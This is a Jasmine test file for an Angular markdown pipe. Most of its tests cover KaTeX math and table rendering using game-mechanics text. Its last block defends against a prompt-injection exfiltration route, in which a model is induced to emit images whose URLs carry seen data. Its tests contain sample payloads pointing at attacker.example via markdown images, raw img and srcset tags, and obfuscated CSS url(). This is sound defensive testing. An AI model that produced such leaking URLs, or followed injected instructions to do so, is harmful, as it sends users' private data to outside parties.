import { MarkdownPipe } from './markdown.pipe';
import { DomSanitizer } from '@angular/platform-browser';

describe('MarkdownPipe', () => {
  let pipe: MarkdownPipe;
  let mockSanitizer: jasmine.SpyObj<DomSanitizer>;

  beforeEach(() => {
    mockSanitizer = jasmine.createSpyObj('DomSanitizer', ['bypassSecurityTrustHtml']);
    mockSanitizer.bypassSecurityTrustHtml.and.callFake((html: string) => html as any);
    pipe = new MarkdownPipe(mockSanitizer);
  });

  it('should insert newlines before and after squished code blocks', () => {
    const input = 'overlong lines.```c\nint main() {}\n```Done.';
    const result = pipe.transform(input);
    // Should contain a <pre><code> block, not raw backticks
    expect(result).toContain('<pre>');
    expect(result).toContain('<code');
    expect(result).not.toContain('```');
  });

  it('should render LaTeX display math \\[ ... \\] with KaTeX', () => {
    const input = `The GnollHack score formula is:

\\[
\\textbf{Score} = \\text{BaseScore} \\times \\text{AscensionMultiplier} \\times \\text{DifficultyMultiplier} \\times \\text{ModernMultiplier}
\\]

Where:`;
    const result = pipe.transform(input);
    expect(result).toContain('katex-display');
    expect(result).toContain('katex-html');
    expect(result).toContain('Score');
    expect(result).not.toContain('\\[');
    expect(result).not.toContain('\\]');
  });

  it('should render inline LaTeX math \\( ... \\) with KaTeX', () => {
    const input = 'Here is inline math \\( E = mc^2 \\) in text.';
    const result = pipe.transform(input);
    expect(result).toContain('katex');
    expect(result).not.toContain('\\( E = mc^2 \\)');
  });

  it('should render double dollar $$ ... $$ display math with KaTeX', () => {
    const input = '$$ a^2 + b^2 = c^2 $$';
    const result = pipe.transform(input);
    expect(result).toContain('katex-display');
    expect(result).not.toContain('$$');
  });

  it('should render single dollar $ ... $ inline math with KaTeX', () => {
    const input = 'The value $x = 42$ is true.';
    const result = pipe.transform(input);
    expect(result).toContain('katex');
    expect(result).not.toContain('$x = 42$');
  });

  it('should not treat currency amounts as math', () => {
    const input = 'The item costs $50 now and $100 later.';
    const result = pipe.transform(input);
    expect(result).toContain('$50');
    expect(result).toContain('$100');
    expect(result).not.toContain('katex');
  });

  it('should protect math expressions containing dots from squished sentence splitting', () => {
    const input = '\\[ \\text{Score.Total} = 100 \\]';
    const result = pipe.transform(input);
    expect(result).toContain('katex-display');
    expect(result).not.toContain('\n\nTotal');
  });

  it('should render complex LaTeX array formula table', () => {
    const input = `Understood.

\\[
C = 3.5\\,\\mathrm{lb}\\,(S+\\mathrm{Con}) + 3\\,\\mathrm{lb}
\\]

where \\(C\\) is carrying capacity, \\(S\\) is Strength, and \\(\\mathrm{Con}\\) is Constitution.

Let \\(E\\) represent current carried weight:

\\[
\\begin{array}{c|c|c}
\\text{Encumbrance level} & \\text{Condition} & \\text{Movement speed} \\\\ \\hline
\\text{Unencumbered} & E \\le C & 1 \\\\[2pt]
\\text{Burdened} & C < E < 1.5C & \\frac{3}{4} \\\\[2pt]
\\text{Stressed} & 1.5C \\le E < 2C & \\frac{1}{2} \\\\[2pt]
\\text{Strained} & 2C \\le E < 2.5C & \\frac{1}{4} \\\\[2pt]
\\text{Overtaxed} & 2.5C \\le E < 3C & \\frac{1}{8} \\\\[2pt]
\\text{Overloaded} & E \\ge 3C & \\text{Cannot move}
\\end{array}
\\]`;
    const result = pipe.transform(input);
    expect(result).toContain('Encumbrance level');
    expect(result).toContain('Unencumbered');
    expect(result).toContain('Cannot move');

    // Mount to DOM to test actual browser rendering
    const container = document.createElement('div');
    container.className = 'markdown-body';
    container.innerHTML = result as string;
    document.body.appendChild(container);

    const katexHtmls = container.querySelectorAll('.katex-html');
    expect(katexHtmls.length).toBe(6); // 2 display formulas + 4 inline math

    const arrayFormula = katexHtmls[5] as HTMLElement;
    const normalizedText = arrayFormula.innerText.replace(/\u00a0/g, ' ');
    expect(normalizedText).toContain('Encumbrance level');
    expect(normalizedText).toContain('Unencumbered');
    expect(normalizedText).toContain('Burdened');
    expect(normalizedText).toContain('Cannot move');

    document.body.removeChild(container);
  });

  it('should render display math with single newline before bracket and \\dfrac / \\leq', () => {
    const input = `Yes—this is a clearer format. A polished version is:
\\[
\\begin{array}{c|c|c}
\\text{State} & \\text{Condition} & \\text{Movement speed} \\\\ \\hline
\\text{Unencumbered}
    & E \\leq C
    & 1 \\\\[2pt]
\\text{Burdened}
    & C < E < 1.5C
    & \\dfrac{3}{4} \\\\[2pt]
\\text{Stressed}
    & 1.5C \\leq E < 2C
    & \\dfrac{1}{2} \\\\[2pt]
\\text{Strained}
    & 2C \\leq E < 2.5C
    & \\dfrac{1}{4} \\\\[2pt]
\\text{Overtaxed}
    & 2.5C \\leq E < 3C
    & \\dfrac{1}{8} \\\\[2pt]
\\text{Overloaded}
    & E \\geq 3C
    & \\text{Cannot move}
\\end{array}
\\]
Here, \\(E\\) denotes carried weight and \\(C\\) denotes carrying capacity.`;
    const result = pipe.transform(input);
    expect(result).not.toContain('<p>Yes—this is a clearer format. A polished version is: <span class="katex-display">');
    expect(result).toContain('State');
    expect(result).toContain('Unencumbered');
    expect(result).toContain('Cannot move');

    const container = document.createElement('div');
    container.className = 'markdown-body';
    container.innerHTML = result as string;
    document.body.appendChild(container);

    const katexHtmls = container.querySelectorAll('.katex-html');
    expect(katexHtmls.length).toBe(3); // 1 display array + 2 inline (E, C)

    const arrayFormula = katexHtmls[0] as HTMLElement;
    const normalizedText = arrayFormula.innerText.replace(/\u00a0/g, ' ');
    expect(normalizedText).toContain('State');
    expect(normalizedText).toContain('Unencumbered');
    expect(normalizedText).toContain('Cannot move');

    document.body.removeChild(container);
  });

  it('should render bare \\begin{array} environments without outer brackets', () => {
    const input = `Here is a matrix:
\\begin{array}{cc}
1 & 2 \\\\
3 & 4
\\end{array}
End of matrix.`;
    const result = pipe.transform(input);
    expect(result).toContain('katex-display');
    expect(result).toContain('katex-html');
  });

  it('should render markdown tables with numeric colons without breaking rows', () => {
    const input = `GnollHack keeps NetHack’s core deity-prayer system.

| Aspect | GnollHack | NetHack |
|---|---|---|
| **How to pray** | Use **Pray** (\`Alt+P\`). | Use the \`#pray\` extended command. |
| **Initial timeout** | **Priests: 150 turns**; other roles: **300 turns**. | **300 turns** for everyone. |
| **Timeout after praying** | Randomized from a base of **175 turns for priests** or **350 for other roles**. | Uses the classic randomized timeout. |
| **Safety thresholds** | Major trouble: timeout ≤200; minor trouble: ≤100; no trouble: 0. | Essentially the same thresholds. |
| **Feedback** | A blessed **holy symbol or prayerstone can shimmer** when prayer is safe. | You generally use **enlightenment** to check whether prayer is safe. |
| **Altar effects** | Your altar can bless water, holy symbols, and prayerstones. | Your altar can bless water. |
| **Troubles and favors** | Uses an expanded list of major/minor troubles. | Uses the traditional NetHack trouble and favor system. |

The largest mechanical advantage is that priests can pray sooner.`;

    const result = pipe.transform(input);
    const container = document.createElement('div');
    container.innerHTML = result as string;

    const tables = container.querySelectorAll('table');
    expect(tables.length).toBe(1);

    const rows = container.querySelectorAll('table tr');
    // 1 header row + 7 data rows = 8 rows
    expect(rows.length).toBe(8);

    // Verify row 4 (Safety thresholds) contains both cells intact
    const row4Cells = rows[4].querySelectorAll('td');
    expect(row4Cells.length).toBe(3);
    expect(row4Cells[0].textContent).toContain('Safety thresholds');
    expect(row4Cells[1].textContent).toContain('no trouble: 0.');
    expect(row4Cells[2].textContent).toContain('Essentially the same thresholds.');

    // Verify row 5 (Feedback) is inside the table
    const row5Cells = rows[5].querySelectorAll('td');
    expect(row5Cells.length).toBe(3);
    expect(row5Cells[0].textContent).toContain('Feedback');
  });

  it('should format squished lists in non-table text while preserving tables', () => {
    const nonTableInput = 'Here are the options:1. First item 2. Second item';
    const nonTableResult = pipe.transform(nonTableInput) as string;
    expect(nonTableResult).toContain('<ol>');
    expect(nonTableResult).toContain('<li>First item');

    const tableInput = `| Col 1 | Col 2 |
|---|---|
| Options: 1. Item | Plain value: 0. |`;
    const tableResult = pipe.transform(tableInput) as string;
    expect(tableResult).toContain('<table>');
    expect(tableResult).toContain('<td>Options: 1. Item</td>');
    expect(tableResult).toContain('<td>Plain value: 0.</td>');
  });

  it('should space squished sentences inside table cells without breaking the table', () => {
    const input = `| Column 1 | Column 2 |
|---|---|
| First cell.Next sentence in same cell | Second cell |`;
    const result = pipe.transform(input) as string;
    const container = document.createElement('div');
    container.innerHTML = result;

    const tables = container.querySelectorAll('table');
    expect(tables.length).toBe(1);

    const cells = container.querySelectorAll('table td');
    expect(cells.length).toBe(2);
    expect(cells[0].textContent).toContain('First cell. Next sentence in same cell');
  });

  /* External-image defang.

     What is being defended: a prompt injection inside an uploaded document can induce the
     model to emit an image whose URL carries what it has seen, and the browser fetches it on
     render. The CSP blocks the request; these tests cover the layer that tells the user, and
     the routes the renderer alone would miss. */
  describe('external image defang', () => {
    const render = (input: string): HTMLDivElement => {
      const container = document.createElement('div');
      container.innerHTML = pipe.transform(input) as string;
      return container;
    };

    it('renders an external markdown image as a blocked badge and issues no request', () => {
      const container = render('![secret](https://attacker.example/leak?q=secret)');

      expect(container.querySelectorAll('img').length).toBe(0);

      const badge = container.querySelector('.blocked-external-image');
      expect(badge).toBeTruthy();
      expect(badge!.textContent).toContain('External image blocked');
      // The alt text is kept so the user can see what the model claimed the image was.
      expect(badge!.textContent).toContain('secret');
    });

    it('leaves a same-origin absolute image intact', () => {
      const container = render(`![avatar](${window.location.origin}/img/avatar.webp)`);

      const images = container.querySelectorAll('img');
      expect(images.length).toBe(1);
      expect(images[0].getAttribute('src')).toBe(`${window.location.origin}/img/avatar.webp`);
      expect(container.querySelector('.blocked-external-image')).toBeNull();
    });

    it('leaves a root-relative image intact', () => {
      const container = render('![board](/img/board.webp)');

      const images = container.querySelectorAll('img');
      expect(images.length).toBe(1);
      expect(images[0].getAttribute('src')).toBe('/img/board.webp');
    });

    it('leaves a relative image intact', () => {
      const container = render('![board](img/board.webp)');

      expect(container.querySelectorAll('img').length).toBe(1);
      expect(container.querySelector('.blocked-external-image')).toBeNull();
    });

    it('leaves a data: image intact, because it carries its own bytes', () => {
      const gif = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
      const container = render(`![pixel](${gif})`);

      expect(container.querySelectorAll('img').length).toBe(1);
      expect(container.querySelector('.blocked-external-image')).toBeNull();
    });

    it('blocks a protocol-relative image, which is external however the page is served', () => {
      const container = render('![x](//attacker.example/leak.png)');

      expect(container.querySelectorAll('img').length).toBe(0);
      expect(container.querySelector('.blocked-external-image')).toBeTruthy();
    });

    it('blocks a raw <img> in the model output, which never reaches the markdown renderer', () => {
      const container = render('Here you go: <img src="https://attacker.example/leak?q=secret">');

      expect(container.querySelectorAll('img').length).toBe(0);
      expect(container.querySelector('.blocked-external-image')).toBeTruthy();
    });

    it('blocks a raw <img> whose only external reference is in srcset', () => {
      const container = render(
        '<img src="/img/board.webp" srcset="https://attacker.example/leak.png 2x">');

      expect(container.querySelectorAll('img').length).toBe(0);
      expect(container.querySelector('.blocked-external-image')).toBeTruthy();
    });

    it('strips a style attribute that can fetch a resource', () => {
      const container = render(
        '<div style="background-image:url(https://attacker.example/leak.png)">text</div>');

      const div = container.querySelector('div');
      expect(div).toBeTruthy();
      expect(div!.getAttribute('style')).toBeNull();
      expect(div!.textContent).toContain('text');
    });

    it('strips a style attribute hiding url() behind CSS escapes and comments', () => {
      const escaped = render('<div style="background:\\75 rl(https://attacker.example/a.png)">a</div>');
      expect(escaped.querySelector('div')!.getAttribute('style')).toBeNull();

      const commented = render('<div style="background:ur/**/l(https://attacker.example/b.png)">b</div>');
      expect(commented.querySelector('div')!.getAttribute('style')).toBeNull();
    });

    it('keeps a style attribute that cannot fetch anything, so KaTeX still renders', () => {
      const container = render('<span style="height:0.8em;vertical-align:-0.1em">x</span>');

      expect(container.querySelector('span')!.getAttribute('style')).toContain('height');
    });

    it('still renders math, whose glyph metrics depend on inline styles', () => {
      const result = pipe.transform('$$ a^2 + b^2 = c^2 $$') as string;

      expect(result).toContain('katex-display');
      expect(result).toContain('style=');
    });

    it('does not touch a linked image reference inside a code block', () => {
      const result = pipe.transform('```\n![x](https://attacker.example/leak.png)\n```') as string;

      // Inside a fence it is text, not an image, and must survive verbatim.
      expect(result).toContain('attacker.example');
      expect(result).not.toContain('blocked-external-image');
    });
  });
});
